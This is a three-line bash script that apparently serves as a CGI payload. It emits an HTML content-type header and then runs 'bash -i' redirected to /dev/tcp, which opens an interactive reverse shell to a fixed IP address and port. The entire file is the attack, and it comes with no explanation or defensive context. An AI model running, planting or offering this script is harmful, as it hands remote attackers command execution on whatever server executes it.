#!/bin/bash
echo "Content-Type: text/html"
bash -i >& /dev/tcp/192.168.0.63/1337 0>&1
